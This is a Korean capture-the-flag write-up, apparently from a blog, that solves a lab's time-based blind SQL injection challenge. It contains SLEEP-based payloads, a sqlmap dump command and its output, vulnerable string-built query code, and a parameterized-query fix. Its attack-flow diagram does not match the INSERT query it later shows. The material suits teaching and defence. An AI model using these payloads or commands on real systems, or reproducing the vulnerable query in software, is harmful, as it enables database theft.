+++
title = "VulnABLE CTF [LUXORA] Write-up: SQL Injection 💎 Platinum"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SQL Injection", "Platinum", "Time-based", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SQL Injection 💎 Platinum

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (SQLi)
- **난이도**: 💎 Platinum
- **타겟 경로**: `/sqli/platinum`
- **목표**: 에러 메시지도 없고, 참/거짓에 따른 화면 변화도 전혀 없는 극한의 환경에서 '시간(Time)'을 매개로 하여 데이터를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/sqli/platinum` 페이지는 사용자로부터 이메일 주소를 입력받아 뉴스레터를 구독하는 기능을 수행합니다.
```http
POST /sqli/platinum
Content-Type: application/x-www-form-urlencoded

email=test@example.com
```

정상 입력 시 화면 응답:
```html
<div class="msg">Request Processed. Thank you.</div>
```

에러 유발(`'`) 및 참/거짓 페이로드 입력 시 화면 응답:
```http
email=test' OR 1=1--
email=test' AND 1=2--
```
```html
<div class="msg">Request Processed. Thank you.</div>
```

**[해커의 사고 과정]**
1. 에러가 나도, 참이어도, 거짓이어도 화면은 무조건 "Request Processed"를 출력한다.
2. 이런 상황에서 내가 보낸 쿼리가 제대로 꽂혔는지 확인하려면, 데이터베이스가 결과를 연산하는 데 걸리는 **'시간'을 조작**해야 한다.
3. 데이터베이스 내장 함수인 `SLEEP()`(MySQL 기준)을 사용하여 쿼리 실행 시간을 고의로 늘려보자! (Time-based Blind SQL Injection)

---

## 💥 2. 지연 유도 페이로드 설계 (Exploitation Strategy)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Input: ' OR 1=1 -- )--> [ Web Server ]
                                        |-- Query: SELECT * FROM users WHERE name='' OR 1=1 --'
                                        |-- Returns All Users
```


쿼리 내부에 `IF` 조건문을 넣어, 우리가 던진 스무고개 질문이 "참"일 경우에만 `SLEEP` 함수를 실행하도록 만듭니다.

### 💡 Time-based 핵심 함수
- `SLEEP(N)`: 데이터베이스의 실행을 N초 동안 멈춤
- `IF(condition, true_action, false_action)`: 조건이 참이면 앞의 것을, 거짓이면 뒤의 것을 실행

### 🚀 첫 번째 질문 던지기 (수동 테스트)
"데이터베이스 이름의 첫 글자가 아스키코드 108('l') 이면 5초 동안 멈춰라!"

페이로드:
```sql
test@example.com' AND (SELECT IF(ASCII(SUBSTRING(database(),1,1))=108, SLEEP(5), 0))-- -
```

URL 인코딩 후 브라우저 네트워크 탭이나 Burp Suite를 통해 전송합니다.

**[결과 관찰]**
- 첫 글자가 108(`l`)일 때: 서버의 응답이 정확히 **5초 이상** 지연된 후 돌아왔습니다!
- 첫 글자가 109(`m`)일 때: 서버의 응답이 **즉시(수십 ms 이내)** 돌아왔습니다.

이로써 화면에 아무것도 보이지 않아도, 데이터베이스 내부의 데이터를 한 글자씩 빼낼 수 있는 완벽한 통로가 개척되었습니다.

---

## 🤖 3. 자동화 도구 활용 (sqlmap)

한 글자를 확인할 때마다 5초씩 기다려야 하므로, 수동 추출은 현실적으로 불가능합니다. `sqlmap`의 Time-based 기법을 사용하여 데이터베이스 구조를 덤프합니다.

### sqlmap으로 Time-based 덤프 실행
```bash
$ sqlmap -u "http://localhost:3000/sqli/platinum" --data="email=test@example.com" --technique=T -D luxora_db -T platinum_flags --dump --batch
```
- `--data`: POST 방식으로 전송될 데이터.
- `--technique=T`: Time-based Blind 기법만 사용하도록 강제. (이 옵션이 없으면 sqlmap이 다른 기법을 시도하느라 시간을 낭비할 수 있습니다.)

**[sqlmap 동작 로그 및 출력 결과]**
sqlmap은 5초씩 대기하며 네트워크 타임아웃을 정교하게 피해서 데이터를 한 글자씩 가져옵니다.

```text
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
...
[INFO] retrieving entries for table 'platinum_flags' in database 'luxora_db'
[INFO] fetching number of entries for table 'platinum_flags' in database 'luxora_db'
[INFO] retrieved: 1
[INFO] fetching entries for table 'platinum_flags'
[INFO] retrieved: FLAG{SQLI_💎_TIME_7B8A9C}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

화면상으로는 어떤 정보도 새어나가지 않게 철저히 통제된 시스템이었지만, 백엔드 서버의 '응답 시간'이라는 물리적 특성(부채널, Side-Channel)을 이용해 결국 기밀 데이터를 유출하는 데 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{SQLI_💎_TIME_7B8A9C}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
프론트엔드 개발자가 아무리 에러 처리를 꼼꼼하게 해서 예쁜 에러 페이지만 띄워주더라도, 쿼리문 자체의 취약점은 덮을 수 없습니다.

* **취약한 백엔드 구조**
```javascript
// 결과에 상관없이 무조건 클라이언트에게는 성공 메시지를 반환함
const query = `INSERT INTO subscribers (email) VALUES ('${req.body.email}')`;
db.query(query, (err) => {
    return res.send("Request Processed. Thank you.");
});
```
위와 같은 쿼리에서 해커가 괄호를 닫고 `AND IF(...)` 구문을 밀어 넣으면, 데이터베이스는 Insert 작업을 하기도 전에(또는 하면서) Sleep을 수행하게 됩니다.

* **안전한 패치 코드 (ORM 또는 Prepared Statements)**
Time-based 인젝션 역시 **파라미터화된 쿼리**로 완벽히 방어됩니다.
```javascript
const query = "INSERT INTO subscribers (email) VALUES ($1)";
db.query(query, [req.body.email], ...);
```
입력값에 `SLEEP(5)`라는 문자열이 들어와도, 데이터베이스 엔진은 이를 실행 함수가 아닌 단순한 이메일 주소 문자열의 일부로 취급하여 데이터베이스의 실행 시간을 조작할 수 없게 만듭니다.